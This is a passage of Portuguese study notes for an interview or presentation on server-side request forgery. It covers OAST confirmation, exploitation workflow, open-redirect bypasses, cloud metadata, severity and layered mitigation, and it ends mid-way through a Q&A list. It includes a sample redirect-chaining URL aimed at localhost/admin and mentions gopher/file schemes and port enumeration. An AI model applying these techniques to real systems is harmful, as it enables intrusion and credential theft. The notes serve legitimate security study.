        OAST é basicamente “provar por fora” que o backend fez a requisição. Você fornece como destino um domínio que você controla (ou um serviço como **Burp Collaborator / Interactsh**) e observa se aparece um callback. Esse callback pode ser:
        
        - **DNS**: o backend tenta resolver o seu domínio (já é evidência de que processou a URL).
        - **HTTP**: o backend efetivamente fez uma requisição web ao seu endpoint.
        
        Uma peça chave aqui é entender que nem todo callback significa “SSRF explorável”. É aí que entra o conceito de **falso positivo**. “Falso positivo”, nesse contexto, é quando você acredita que o callback veio do componente vulnerável, mas na verdade ele veio de outro lugar. Os casos mais comuns são:
        
        1. **Seu próprio navegador/cliente** fez a requisição sem você perceber (por exemplo, você colou/abriu a URL no browser, carregou uma imagem, ou o front-end pré-carregou algo).
        2. Um **bot de preview/segurança** (Teams/Slack, proxies corporativos, scanners) acessou a URL automaticamente.
        3. O backend fez apenas uma **validação parcial**, como resolver DNS ou checar formato, mas não faz o “fetch” completo. Você vê DNS e conclui “SSRF”, mas pode não existir caminho de impacto.
        
        A postura madura é: você não “se empolga” com um único sinal. Você correla com o momento exato em que você acionou a funcionalidade, usa identificadores únicos (para garantir correlação), e evita qualquer ação do cliente que possa gerar tráfego acidental. Em entrevista, o que pega bem é você dizer algo do tipo: “Blind SSRF eu confirmo via OAST, mas sempre tento eliminar falsos positivos, porque callback pode vir do cliente ou de automações”.
        
        Além disso, ao confirmar, você também começa uma **triagem do comportamento**: a aplicação segue redirects? restringe destinos? bloqueia internos? tem timeouts agressivos? aceita apenas http/https? Isso tudo define qual caminho de exploração é plausível e te impede de desperdiçar tempo.
        
        ---
        
        # Módulo 5 — Exploração progressiva: o workflow que evita bagunça
        
        Depois de confirmado SSRF, a forma profissional de explorar não é “tacar payload”. É seguir um **workflow progressivo**, que vai do mais simples e seguro ao mais impactante, sempre reduzindo ruído e aumentando evidência. Esse workflow é o que te permite responder perguntas difíceis sem travar, porque você sempre volta ao “processo”.
        
        O fluxo mental mais sólido é:
        
        1. **Confirmar SSRF** (com evidência)
        2. **Classificar**: Basic ou Blind
        3. **Caracterizar restrições**: allowlist/denylist? redirects? egress? schemes?
        4. **Medir alcance**: o servidor alcança localhost? alcança rede interna?
        5. **Mapear alvos relevantes**: admin/internal APIs/serviços/metadata
        6. **Concluir impacto e documentar**: o que foi provado vs o que é potencial
        
        O ponto mais importante: **nem todo SSRF precisa virar “scan”**. Você só enumera portas/diretórios/subdomínios se já tiver algum sinal de que isso faz sentido e não vai virar barulho. Em entrevista, você passa maturidade quando fala: “eu primeiro entendo o alcance e as restrições; só depois eu faço enumeração para buscar um alvo específico de valor”.
        
        Também é importante entender que “exploração” não é só exfiltrar dados. Em muitos casos, o SSRF já é grave por permitir:
        
        - acessar um endpoint interno administrativo
        - mapear a topologia interna
        - alcançar sistemas que confiam na rede interna
        - encadear com outra falha
        
        Ou seja: você pensa em SSRF como uma **ponte de rede** — às vezes a ponte por si só já é o achado principal.
        
        Um detalhe relevante para Blind SSRF: frequentemente você não consegue “ver” o que acessou, então o que você busca são **evidências indiretas consistentes** (callbacks, timing, diferenças de erro). A maturidade aqui é não vender certeza sem evidência: você descreve o comportamento e apresenta hipóteses com honestidade.
        
        ---
        
        # Módulo 6 — Redirects e chaining: Open Redirect + SSRF como bypass “inteligente”
        
        Open Redirect é quando existe um endpoint no próprio site que faz algo como “redirecionar para uma URL que o usuário escolhe”. Sozinho, open redirect muitas vezes é tratado como risco menor (porque costuma ser usado para phishing). Mas quando você tem SSRF, a história muda totalmente.
        
        Por quê? Porque muitas “defesas” de SSRF são do tipo:
        
        > “Só permito URLs que começam com [https://meusite.com/](https://meusite.com/) …”
        > 
        
        Isso é uma allowlist ingênua baseada em string. Se o site tem um open redirect como:
        
        - `/redirect?url=DESTINO`
        
        Você pode fornecer como URL “permitida”:
        
        - `https://meusite.com/redirect?url=http://localhost/admin`
        
        A validação vê “meusite.com” e deixa passar. Só que o backend segue o redirect e termina acessando `localhost/admin`. Isso é o que chamamos de **redirect chaining**: a URL inicial passa na validação, mas o destino final é proibido.
        
        A forma madura de explicar isso em entrevista é enfatizar o erro de design:
        
        - validar apenas a URL inicial não basta
        - se o backend segue redirect, é obrigatório revalidar o destino final
        - allowlist precisa considerar DNS/IP final e não só texto
        
        Aqui entra também a ideia de “onde isso se encaixa no workflow”: open redirect chaining é tipicamente um **bypass**, isto é, você usa quando existe uma restrição (“só posso acessar o próprio domínio”). Então você aprende a encaixar isso como ramo condicional: “se houver filtro/allowlist, eu avalio se existe open redirect interno para encadear”.
        
        Isso demonstra maturidade porque você não está “tentando aleatório”; você está explorando uma falha de lógica de validação.
        
        # Módulo 7 — Filtros e bypass: entendendo o “porquê” (sem virar coleção de payload)
        
        Quando você vê “defesas anti-SSRF” em sistemas reais, quase sempre são tentativas rápidas e incompletas. O seu objetivo como auditor é entender **por que elas falham**, não decorar 50 bypasses. A lógica por trás da maioria dos bypasses se resume a isto:
        
        ### 1) Validar a URL como *string* não valida o destino real
        
        Muitas defesas fazem algo como “se a URL contém ‘localhost’ bloqueia” ou “se começa com `https://meusite.com` permite”. Esse tipo de validação é frágil porque URL é uma estrutura que passa por parsing/normalização, e a execução (biblioteca HTTP) pode interpretar o destino de forma diferente do validador. A consequência é clássica: você **valida A**, mas acessa **B**.
        
        ### 2) Normalização/decoding pode mudar a URL depois da validação
        
        Se a aplicação ou bibliotecas fazem decode/normalização em etapas diferentes (por exemplo, decodificam `%xx` em momentos diferentes), uma validação pode ser feita numa versão “pré-decode” e o request real numa versão “pós-decode”. É assim que aparecem casos de “double encoding”: não como magia, mas como reflexo de **camadas decodificando em momentos diferentes**.
        
        ### 3) Hostname ≠ IP final (DNS é parte do problema)
        
        Mesmo que o sistema valide o hostname, o que importa é o IP final que ele resolve no momento do request. Um domínio pode resolver para IP interno, ou mudar resolução com o tempo (conceito de DNS rebinding). Então, allowlist de hostname sem validar o IP final é frequentemente insuficiente.
        
        ### 4) Redirects mudam destino final e quebram allowlists ingênuas
        
        Uma validação pode checar a URL inicial, mas se o backend segue redirects, o destino final pode ser outro host. Sem revalidar após redirects, a defesa perde efetividade. É por isso que **Open Redirect + SSRF** funciona tão bem: você passa pela “porta permitida” e o redirect leva ao alvo proibido.
        
        ### Como “pensar” bypass sem decorar payload
        
        Em entrevista e na sua apresentação, o que impressiona é você dizer:
        
        - “eu primeiro entendo onde ocorre a validação”
        - “eu verifico se há normalização/redirect”
        - “eu me preocupo com IP final e não só hostname”
            
            Isso mostra que você entende o problema de forma sistêmica.
            
        
        **Frase forte (para memorizar):**
        
        > “A maioria dos bypasses existe porque validação, parsing, resolução DNS e redirects acontecem em camadas diferentes — se o destino final não for validado, sempre sobra um caminho.”
        > 
        
        ---
        
        # Módulo 8 — SSRF em Cloud: metadata, identidade e por que a gravidade dispara
        
        Cloud não é “um tipo de SSRF”; é o cenário em que SSRF costuma ficar mais crítico. O motivo é simples: uma aplicação rodando em cloud muitas vezes tem uma “identidade” e acesso privilegiado a recursos internos.
        
        ### 1) O que é “metadata service” (sem decorar endereço)
        
        Provedores cloud disponibilizam endpoints internos que só deveriam ser acessíveis pela instância para obter informações do ambiente (metadados). Em alguns casos, esse serviço também pode fornecer **credenciais temporárias** associadas ao papel/role da instância. Isso é gravíssimo, porque credenciais temporárias são o que permite a instância agir na conta cloud.
        
        ### 2) O que muda com SSRF
        
        Sem SSRF, um atacante externo não alcança esses endpoints internos. Com SSRF, ele passa a “usar” a rede do servidor. O risco então evolui de:
        
        - “acessar uma página interna”
            
            para
            
        - “obter identidade/credenciais e acessar recursos fora da aplicação”
        
        Isso é um salto de impacto enorme e é exatamente por isso que o caso Capital One se tornou tão famoso.
        
        ### 3) IMDSv2 (conceito) e por que ajuda
        
        IMDSv2 adiciona um mecanismo de token/handshake para acessar metadata. Isso dificulta SSRF trivial (um GET simples). Mas é importante comunicar a nuance:
        
        - IMDSv2 reduz um caminho comum de exploração
        - não “remove SSRF” como classe
        - o ambiente precisa estar corretamente configurado para realmente ajudar
        
        ### 4) O que o entrevistador quer ouvir nesse tema
        
        - “Cloud aumenta o impacto porque pode envolver credenciais”
        - “Metadata é um alvo interno crítico”
        - “Mitigação envolve controle cloud + rede + validação no app”
        
        **Frase curta (para memorizar):**
        
        > “Em cloud, SSRF pode sair do domínio da aplicação e virar comprometimento de recursos da conta, porque a instância pode expor identidade/credenciais via serviços internos.”
        > 
        
        ---
        
        # Módulo 9 — Impacto e severidade: como avaliar SSRF (inclui ‘sem impacto aparente’)
        
        Um dos pontos mais maduros em entrevista é saber explicar que severidade em SSRF não é “sempre crítica” nem “sempre baixa”. Ela depende do contexto: o que o backend alcança, quais ativos existem e quais controles de rede estão presentes.
        
        ### 1) Impactos possíveis (visão geral)
        
        - **Confidentiality (C):** acesso a dados internos, endpoints de debug, informações sensíveis, credenciais (cloud).
        - **Integrity (I):** acionar endpoints internos que alteram estado (ex.: operações administrativas), ou encadear com falhas de autorização internas.
        - **Availability (A):** forçar o servidor a fazer requests caros, loops de redirects, downloads grandes, atingindo endpoints internos lentos (DoS).
        
        É por isso que usar a CIA triad no slide de impacto é excelente: você demonstra conhecimento de fundamento e conecta com efeitos reais.
        
        ### 2) SSRF “sem impacto demonstrado”
        
        Isso é comum na vida real: você prova que o backend faz request para destinos controláveis, mas não consegue alcançar nada interno ou sensível. A pergunta é: “isso é vulnerabilidade?”
        
        A resposta madura é:
        
        - **o comportamento é um bug/vetor** (controle indevido de destino server-side)
        - mas a **severidade pode ser low/informational** se:
            - egress é restrito
            - não há internos acessíveis
            - não há leitura/ação sensível demonstrável
        
        Mesmo assim, costuma merecer correção porque:
        
        - a arquitetura pode mudar (microservices internos novos)
        - pode virar cadeia com outro bug
        - pode haver risco de DoS ou exploração futura
        
        ### 3) Como reportar sem exagerar (muito importante)
        
        Você separa:
        
        - **Evidência**: o que você provou (callback/resultado)
        - **Alcance**: o que é acessível hoje
        - **Potencial**: riscos condicionais (“se existir metadata acessível…”, “se houver internal APIs…”)
            
            Isso evita parecer alarmista e passa profissionalismo.
            
        
        **Frase curta (para memorizar):**
        
        > “SSRF é um vetor; severidade depende do alcance do fetcher e dos ativos atingíveis. Eu reporto o que provei e descrevo o risco potencial de forma condicionada.”
        > 
        
        ---
        
        ## Agora os módulos finais (10–12)
        
        # Módulo 10 — Mitigação profissional: errada → bypass → correta (defense-in-depth)
        
        A forma mais convincente de falar de prevenção é mostrar que “mitigação superficial” falha, e então apresentar uma mitigação **por camadas**.
        
        ### 1) Mitigações comuns (ingênuas)
        
        - Bloquear “localhost” por string
        - Regex simples
        - Checar `startsWith("https://dominio-permitido")`
        - Permitir redirects sem revalidar
            
            Essas defesas falham porque não garantem o destino final (parsing/DNS/redirects).
            
        
        ### 2) Mitigação correta (camada aplicação)
        
        O ideal é **não aceitar URL arbitrária**. Se precisar aceitar:
        
        - allowlist real (destinos aprovados)
        - validar destino final (DNS → IP final) e bloquear ranges internos
        - controlar redirects (não seguir automaticamente ou revalidar a cada hop)
        - limitar métodos, tempo, tamanho de resposta
        - registrar logs e limitar abuso
        
        ### 3) Mitigação correta (camada rede)
        
        - **Egress filtering**: o servidor só sai para o mínimo necessário
        - segmentação: separar o “fetcher” do resto e limitar rotas
            
            Essa camada reduz impacto mesmo se houver bug.
            
        
        ### 4) Mitigação correta (camada cloud)
        
        - hardening do metadata access (ex.: IMDSv2 e restrições)
        - políticas/roles mínimos (least privilege)
        - monitoramento de chamadas suspeitas
        
        A Rana organiza muito bem essa parte como defense-in-depth app + network, e você pode citar OWASP SSRF Prevention Cheat Sheet como base.
        
        **Frase curta:**
        
        > “A melhor mitigação é design: não aceitar URL arbitrária. Quando isso é necessário, a correção real é defense-in-depth: validação robusta + egress control + segmentação + hardening cloud.”
        > 
        
        ---
        
        # Módulo 11 — Como transformar isso em apresentação fluida (núcleo + apêndice)
        
        A chave para caber em 15 minutos é aceitar que:
        
        - o núcleo ensina e prova entendimento
        - o apêndice é “munição” para perguntas
        
        ### Núcleo (o que você sempre cobre)
        
        - O que é SSRF + server-side vs client-side
        - Onde aparece (identification)
        - Basic vs Blind + evidência (OAST + falso positivo)
        - Workflow de exploração progressiva (escada)
        - Cloud (curto, separado)
        - Impacto (CIA + caso real)
        - Mitigação (errada → bypass → correta)
        
        ### Apêndice (para Q&A)
        
        - lista de bypasses (em categorias)
        - enumeração (port/directory/subdomain)
        - schemes (file/gopher) como “quando considerar”
        - ferramentas/automação
        - severidade (low vs critical)
        
        Esse formato é ótimo porque você passa segurança: “eu sei o core e tenho profundidade se perguntarem”.
        
        ---
        
        # Módulo 12 — Avançado leve: conceitos para não ser pego de surpresa
        
        Você não precisa dominar como especialista, mas precisa entender o “porquê” se perguntarem.
        
        ### 1) Parser inconsistencies
        
        Quando o validador interpreta a URL de um jeito e o cliente HTTP/proxy interpreta de outro. Isso explica muitos bypasses sofisticados sem precisar de payload.
        
        ### 2) Proxy/cache e evidência
        
        Infra intermediária pode alterar comportamento/headers e até gerar callbacks inesperados. Isso se conecta com “falsos positivos” e com por que validação precisa considerar o caminho real.
        
        ### 3) Second-order SSRF
        
        O request não acontece na hora: o sistema salva a URL e um worker faz fetch depois. Isso dificulta correlacionar evidência e é comum em pipelines assíncronos.
        
        ### 4) Chaining com outras classes
        
        SSRF pode aparecer como efeito de XXE (parser fazendo request) ou se combinar com falhas de roteamento/proxy. O objetivo aqui é você conseguir dizer:
        
        > “Eu entendo o conceito e por que isso aumenta superfície, mesmo que eu não tenha explorado isso profundamente.”
        > 
        
        **Frase curta:**
        
        > “Esses casos avançados geralmente nascem de discrepância entre validação e execução, e de arquiteturas com múltiplas camadas (proxy/worker).”
        > 
    - **Estudo**
        
        ### **1. OAST (Out-of-Band Application Security Testing)**
        
        - **Definição e conceito:** Teste de segurança onde a evidência é coletada por um canal **fora da aplicação** (ex.: DNS, HTTP callbacks).
        - **Quando usar:** Blind SSRF / Blind XSS / outros ataques em que a resposta não é diretamente refletida.
        - **Exemplo prático:** Receber resposta de callback via DNS ou HTTP após um ataque SSRF.
        
        ---
        
        ### **2. DNS / DNS Rebinding**
        
        - **DNS:** Sistema de nomes de domínio. Usado para resolver hostnames para IPs.
        - **DNS Rebinding:** Técnica que permite que um atacante contorne políticas de segurança, como CORS, fazendo com que um navegador confunda domínios diferentes como um único.
        - **Por que estudar:** Conhecer como funciona DNS e como o rebinding pode ser explorado em SSRF, tornando a vulnerabilidade mais grave.
        - **Como aplicar:** Quando um atacante consegue redirecionar uma requisição via DNS para um IP interno.
        
        ---
        
        ### **3. Cloud (Metadata e Serviços Internos)**
        
        - **IMDS (Instance Metadata Service):** Endpoint interno usado para fornecer dados da instância (ex.: credenciais temporárias).
        - **Credenciais temporárias:** **IAM roles** que são fornecidas pela cloud para interagir com recursos da cloud, podem ser usadas em ataques via SSRF para escalonamento de privilégios.
        - **Acesso a recursos internos:** O que significa acessar recursos internos da cloud via SSRF (ex.: S3, EC2).
        - **Por que estudar:** Muitas explorações de SSRF resultam em acessos a **dados privados** ou **credenciais de instâncias** da cloud.
        
        ---
        
        ### **4. Egress Filtering**
        
        - **Definição:** Controle de tráfego de saída, onde apenas conexões permitidas são feitas para destinos fora da rede.
        - **Relação com SSRF:** Como e por que o egress filtering pode prevenir ou limitar ataques de SSRF, e como atacantes tentam contornar.
        - **Exemplo:** Um servidor pode ter regras de saída que bloqueiam tráfego para IPs internos ou serviços privados da cloud.
        
        ---
        
        ### **5. Hardening (Segurança em Camadas)**
        
        - **Definição:** Conjunto de práticas para reforçar a segurança de sistemas, aplicativos e redes.
        - **Relação com SSRF:** Conhecimento de como configurar regras e práticas que podem mitigar SSRF, como bloqueio de acesso a metadata, implementação de autenticação robusta, e minimização do impacto de falhas de segurança.
        - **Exemplo:** Desabilitar a capacidade de realizar requisições HTTP internas através de proxies ou firewalls.
        
        ---
        
        ### **6. Fetch e Hops**
        
        - **Fetch:** Quando falamos sobre SSRF, o "fetch" é o processo de realizar uma requisição HTTP/HTTPS a um destino determinado.
        - **Hops:** São as etapas de uma requisição de rede, como quando a requisição passa de um servidor para outro (ex.: de proxy para destino final).
        - **Por que estudar:** Importante para entender como as requisições via SSRF podem pular por firewalls, proxies, e outros sistemas de segurança.
        
        ---
        
        ### **7. Parsing (Parsing/Encoding em diferentes linguagens)**
        
        - **Definição:** O processo de leitura e transformação de dados (por exemplo, transformar uma string em um endereço válido).
        - **Exemplo de Parsing e Encoding:** Como os parâmetros passados em URLs ou em cabeçalhos HTTP são tratados, e como isso pode ser explorado.
        - **Como isso se aplica em SSRF:** Você precisa entender os tipos de encoding usados por diferentes servidores e como essas falhas são exploradas (ex.: octal encoding, base64 encoding, URL encoding).
        - **Linguagens de interesse:** Importante saber sobre como **PHP** ou **JavaScript** lidam com URL parsing, já que o SSRF pode ser explorado de forma diferente dependendo da linguagem backend.
        
        ---
        
        ### **8. Redirects e Open Redirect**
        
        - **Open Redirect:** Técnica em que a aplicação redireciona para URLs externas sem validação adequada.
        - **Por que estudar:** Muitos ataques de SSRF são possíveis porque o backend da aplicação permite redirecionamentos para destinos controlados por um atacante.
        - **Exemplo prático:** Usar uma URL com redirect para contornar restrições de segurança, permitindo o SSRF.
        
        ---
        
        ### **9. Exploração Progressiva em SSRF**
        
        - **Definição:** Como atacar uma vulnerabilidade SSRF e escalar seu impacto.
        - **Componentes principais a explorar:**
            - Identificação de endpoints vulneráveis.
            - Enumeração de IPs e portas.
            - Exploração de serviços internos (ex.: file://, gopher://).
            - **Quando entrar Cloud:** Como a exploração de SSRF pode passar a incluir metadata da instância da cloud e credenciais temporárias.
        
        ---
        
        ### **10. Falsos positivos**
        
        - **Definição:** Erros em que uma vulnerabilidade é identificada, mas na verdade não existe.
        - **Por que estudar:** Importante para distinguir entre **um ataque legítimo** e um **ruído gerado por configurações de rede, cache ou proxy**.
        - **Exemplo de falsos positivos em SSRF:** Ao testar portas ou serviços internos, você pode se deparar com erros semelhantes a portas abertas, mas que na verdade são mensagens de erro genéricas.
        
        ---
        
        ### **11. Testing e Ferramentas**
        
        - **Ferramentas importantes para testes de SSRF**:
            - **Burp Suite** (para interceptação, manipulação de requisições).
            - **ffuf** (para fuzzing e enumeração de portas e diretórios).
            - **cURL** e **netcat** (para testagens manuais).
            - **Interacter** (para OAST).
        
        ---
        
        ### **12. Como explicar SSRF e Blind SSRF**
        
        - **SSRF**: Explique de forma simples: "Server-Side Request Forgery ocorre quando uma aplicação realiza uma requisição HTTP para um destino controlado pelo atacante."
        - **Blind SSRF**: Explique que a **diferenciação** do Blind ocorre porque o **atacante não recebe uma resposta direta da aplicação** (é fora da aplicação, como uma resposta no callback).
        
        ---
        
        ### **13. Dicas adicionais para entrevista**
        
        - **Focar na “exploração progressiva”** e em **como a severidade do SSRF pode aumentar** dependendo de onde o ataque vai.
        - **Preparar para perguntas sobre mitigação:** explique como bloqueios de egress filtering, IMDS hardening e controles de rede ajudam a mitigar SSRF.
        
        ---
        
        Essa lista cobre **todos os principais termos** e conceitos de SSRF, com o que você precisa saber para **explicar bem** e responder **perguntas técnicas**. A ideia é garantir que você tenha uma **fundamentação sólida** para tudo, com foco em exemplos práticos, impacto e como as defesas funcionam.
        
    - Anotacoes apresentacao
        
        **Definição SSRF** → 
        
        **Porque é perigoso**? → citar que rede interna tem CONFIANCA → sem restricao de firewall
        
        Onde costuma aparecer → 
        
        Tipos SSRF → 
        
    - **Perguntas e Respostas**
        
        ## Nível 0 — Aquecimento (clareza + comunicação)
        
        **Q1. Em uma frase, o que é SSRF?**
        
        **A:** SSRF (*Server-Side Request Forgery*) é quando um atacante consegue fazer o **servidor** da aplicação realizar uma requisição para um destino que ele controla ou escolhe, explorando um “fetch” server-side.
        
        **Q2. Qual a intuição do SSRF para alguém não técnico?**
        
        **A:** É como “enganar o sistema para ele abrir um link por você”, só que quem abre é o servidor — e ele pode ter acesso a coisas internas que o usuário nunca veria.
        
        **Q3. Explicar SSRF para RH em 30s?**
        
        **A:** É uma falha onde uma funcionalidade que busca URLs pode ser manipulada, levando o servidor a acessar recursos internos ou sensíveis. O risco depende muito do que o servidor consegue alcançar na rede.
        
        **Q4. Explicar SSRF para um dev backend em 30s?**
        
        **A:** É o abuso de qualquer ponto em que o backend consome uma URL controlável, sem validação robusta do **destino final** (DNS/IP/redirect). O problema geralmente é *trust boundary* + egress permissivo.
        
        **Q5. Qual erro de confiança central por trás do SSRF?**
        
        **A:** Tratar uma URL (ou host) vinda do usuário como se fosse confiável e permitir que ela atravesse para a rede/serviços internos sem controles fortes.
        
        **Q6. Por que SSRF é tão relevante hoje?**
        
        **A:** Porque em microservices e cloud o backend normalmente tem acesso privilegiado à rede interna e, às vezes, a serviços de identidade/metadata — então a falha escala muito.
        
        **Q7. Diferença prática: request do usuário vs request do servidor?**
        
        **A:** O request do servidor pode sair de uma rede com rotas internas, permissões e acesso a serviços que o usuário não tem; então o “alcance” e o impacto mudam completamente.
        
        ---
        
        ## Nível 1 — Fundamentos (fluxo, termos, conceitos)
        
        **Q8. O que significa “Server-Side” em SSRF?**
        
        **A:** Significa que a requisição é executada na infraestrutura da aplicação (backend), não no navegador do usuário — e isso muda quem tem acesso ao quê.
        
        **Q9. SSRF sempre envolve HTTP?**
        
        **A:** Na prática é mais comum em HTTP/HTTPS, mas pode envolver outros *schemes/protocolos* dependendo da biblioteca e do ambiente; o ponto é “backend fazendo request”.
        
        **Q10. SSRF é input validation ou falha de design?**
        
        **A:** Os dois. Pode começar como validação fraca, mas o impacto sério normalmente vem do **design**: o backend tem acesso privilegiado e não deveria obedecer destinos arbitrários.
        
        **Q11. O que é trust boundary e como quebra no SSRF?**
        
        **A:** É o limite entre input não confiável e recursos confiáveis. No SSRF, a URL do usuário atravessa esse limite e vira tráfego do servidor para áreas internas.
        
        **Q12. Qual diferença entre SSRF e uma feature legítima de “fetch”?**
        
        **A:** A feature legítima controla destinos e aplica validações/controles de rede; no SSRF o usuário influencia o destino de forma que viola políticas (rede interna, metadata etc.).
        
        **Q13. O que é URL parsing e por que importa?**
        
        **A:** É como o sistema interpreta host/porta/caminho. Se a validação interpreta de um jeito e o cliente HTTP executa de outro, surgem bypasses.
        
        **Q14. O que é “seguir redirects” e por que é perigoso?**
        
        **A:** É quando o backend segue HTTP 30x automaticamente. Se ele só valida a URL inicial e não o destino final, um redirect pode levar a um alvo proibido.
        
        **Q15. Em quais camadas o SSRF pode causar impacto?**
        
        **A:** App (endpoints e dados), rede (serviços internos), cloud (metadata/identidade), e às vezes infraestrutura inteira se houver credenciais expostas.
        
        ---
        
        ## Nível 2 — Onde SSRF aparece (Identification / Hunting)
        
        **Q16. Que funcionalidades você prioriza para caçar SSRF?**
        
        **A:** Qualquer fluxo onde o backend “baixa” ou “consulta” uma URL: previews, import, webhooks, imagem por URL, PDF, integrações e “stock check”.
        
        **Q17. Quais parâmetros “cheiram” a SSRF?**
        
        **A:** Campos como `url/link/callback/webhook/image/stockApi/fetch/path/redirect`, ou qualquer input que claramente vira destino de requisição.
        
        **Q18. SSRF pode aparecer em upload? Como?**
        
        **A:** Sim: “upload via URL”, onde o servidor baixa o arquivo remotamente em vez de receber um arquivo direto do cliente.
        
        **Q19. SSRF em link preview (unfurling)?**
        
        **A:** Sim: o servidor busca a página para extrair título/imagem/metadata. Se você controla a URL, você pode apontar para alvos internos.
        
        **Q20. SSRF em webhooks?**
        
        **A:** Sim: webhooks fazem callbacks server-side. O risco aparece se o usuário define o destino do callback sem restrições robustas.
        
        **Q21. SSRF em integrações com APIs externas?**
        
        **A:** Sim: se o usuário consegue mudar “endpoint base” ou destino de chamada, pode redirecionar o backend para serviços internos/metadata.
        
        **Q22. SSRF em geração de PDF?**
        
        **A:** Sim: muitos geradores baixam recursos (CSS/imagens/links) para montar o PDF, o que pode puxar conteúdo interno se não houver bloqueios.
        
        **Q23. SSRF em avatar/thumbnail por URL?**
        
        **A:** Sim: o backend baixa a imagem para armazenar/cachar. Isso costuma ser um vetor clássico de SSRF.
        
        **Q24. Import por URL (CSV/XML/JSON) pode ser SSRF?**
        
        **A:** Pode: o servidor busca o arquivo remoto. Em alguns formatos (ex.: XML) ainda pode haver outros encadeamentos que geram requests indiretos.
        
        **Q25. Em IoT, onde isso aparece?**
        
        **A:** Em fluxos de “update/configuração”, onde o dispositivo/backend consulta URLs de update, telemetry ou recursos; se o destino for manipulável, vira SSRF.
        
        **Q26. Que logs/telemetria ajudam a detectar SSRF?**
        
        **A:** Logs de egress, DNS queries, requests do serviço de fetch e auditoria por usuário/endpoint, pois SSRF deixa padrões estranhos de destinos.
        
        **Q27. Quais anti-patterns de dev criam SSRF?**
        
        **A:** “Aceitar URL do usuário”, validar por string simples, seguir redirects automaticamente, e rodar o fetcher com acesso amplo de rede.
        
        **Q28. URL do usuário vs ID interno: por que ID é melhor?**
        
        **A:** Porque o usuário escolhe “o que quer” por um identificador, mas o sistema resolve o destino dentro de uma lista controlada — reduzindo a superfície de SSRF.
        
        ---
        
        ## Nível 3 — Tipos (Basic/Blind) e nuances
        
        **Q29. Diferença entre Basic SSRF e Blind SSRF?**
        
        **A:** No Basic, você vê a resposta retornando na tela; no Blind, o request ocorre, mas o conteúdo não é exibido — exigindo confirmação indireta.
        
        **Q30. Que evidência você espera ver no Basic SSRF?**
        
        **A:** Conteúdo/HTML/headers/erros coerentes com o destino requisitado, ou mudanças previsíveis quando você altera host/rota.
        
        **Q31. Que evidência você espera ver no Blind SSRF?**
        
        **A:** Sinais indiretos: callback (OAST), diferenças de tempo/erro, ou comportamento consistente indicando tentativa de conexão.
        
        **Q32. O que é OAST e por que ele aparece em Blind SSRF?**
        
        **A:** OAST é provar a interação por um canal “fora da banda” (DNS/HTTP) usando um domínio/serviço seu. Em Blind SSRF isso é essencial porque não há resposta refletida.
        
        **Q33. Por que DNS callback pode ser mais útil que HTTP callback?**
        
        **A:** Porque em muitos ambientes DNS sai mesmo quando HTTP não sai (firewall/egress). DNS já prova que o backend tentou alcançar seu domínio.
        
        **Q34. O que é “falso positivo” ao confirmar Blind SSRF (onde o erro acontece)?**
        
        **A:** É quando você vê um callback e conclui “SSRF”, mas o tráfego veio de outro lugar: seu navegador, um preview/bot (Teams/Slack), ou uma validação que só resolve DNS sem fetch real. O erro é atribuir o request ao componente vulnerável sem correlacionar.
        
        **Q35. Como diferenciar “foi o servidor” vs “foi o browser”?**
        
        **A:** Você busca correlação: o callback ocorre quando você só envia o parâmetro (sem abrir o link), ocorre no timing do acionamento e, quando possível, mostra características de tráfego server-side (origem/gateway/headers).
        
        **Q36. Blind SSRF é sempre “sem sinal nenhum”?**
        
        **A:** Não. Às vezes há pistas: diferenças de tempo, status genérico vs erro, ou mensagens mudando conforme o destino. O ideal é combinar essas pistas com OAST.
        
        **Q37. Existe “semi-blind”?**
        
        **A:** Sim: a aplicação não mostra conteúdo, mas retorna “OK/erro” de formas diferentes dependendo se conectou, redirecionou ou sofreu timeout.
        
        **Q38. O que é “response sanitization” e por que importa?**
        
        **A:** É quando o app filtra/normaliza a resposta (tira HTML, limita tamanho). Isso não elimina SSRF, mas reduz o que você consegue observar no Basic.
        
        ---
        
        ## Nível 4 — Confirmação e caracterização (triagem)
        
        **Q39. Como confirmar SSRF de forma limpa?**
        
        **A:** Provar que o backend fez o request: no Basic, pela resposta coerente; no Blind, por OAST/callback e consistência temporal com a ação no app.
        
        **Q40. Riscos de testar SSRF em ambiente real?**
        
        **A:** Pode causar impacto em serviços internos (DoS), acessar dados sem necessidade e gerar ruído. Por isso você testa com cuidado, em escopo e com volume baixo.
        
        **Q41. Que parâmetro você muda primeiro?**
        
        **A:** O que define o destino (URL/host/path), mantendo o resto igual para isolar a causa e evitar confundir com outras variáveis.
        
        **Q42. Como suspeitar de “fetcher” intermediário?**
        
        **A:** Se vários endpoints geram requests com padrões idênticos (mesmo user-agent/tempo/limites), pode existir um serviço central de fetch/proxy fazendo o trabalho.
        
        **Q43. Como descobrir se o backend segue redirects?**
        
        **A:** Você observa se uma URL que responde com 30x leva o backend ao destino final. Isso é crucial porque redirects abrem caminho para chaining (Open Redirect).
        
        **Q44. Como inferir allowlist/denylist?**
        
        **A:** Pelo padrão de aceitação/rejeição: alguns destinos funcionam sempre, outros falham sempre com mensagens parecidas. Repetibilidade geralmente indica regra.
        
        **Q45. Bloqueio de IP interno/localhost: como perceber?**
        
        **A:** Quando destinos internos falham de forma consistente (antes mesmo de tentar conectar) ou retornam erro específico. Mas você também considera a hipótese “rede não roteia” (não é sempre filtro).
        
        **Q46. Como saber se só HTTP/HTTPS é aceito?**
        
        **A:** Observando se o sistema rejeita outros schemes, se normaliza a URL, ou se dá erro de parser. Nem toda stack permitirá `file://`/`gopher://`.
        
        **Q47. Que sinais mostram “isso veio do servidor”?**
        
        **A:** Em geral: origem de rede diferente do cliente, headers/UA típicos de biblioteca, timing exato ao acionar a função. Nem sempre dá para ver tudo, então correlação é o principal.
        
        **Q48. Como evitar “over-testing”?**
        
        **A:** Poucos testes bem escolhidos, timeouts pequenos, sem varrer ranges grandes, e foco em provar comportamento e alcance.
        
        **Q49. Qual evidência mínima num relatório?**
        
        **A:** Request/param vulnerável, prova do fetch (resposta ou callback), descrição do alcance (o que consegue atingir) e impacto potencial baseado no contexto.
        
        ---
        
        ## Nível 5 — Exploração progressiva (workflow mental)
        
        **Q50. Sequência lógica de exploração (alto nível)?**
        
        **A:** Confirmar → classificar (basic/blind) → mapear restrições (redirect/allowlist/egress) → medir alcance (interno/localhost) → buscar alvos de alto valor (admin/metadata) → documentar impacto.
        
        **Q51. Por que testar localhost costuma ser primeiro?**
        
        **A:** Porque muitos painéis/serviços internos só escutam localmente e assumem que “ninguém externo” chega neles — SSRF quebra essa suposição.
        
        **Q52. Por que ranges internos importam?**
        
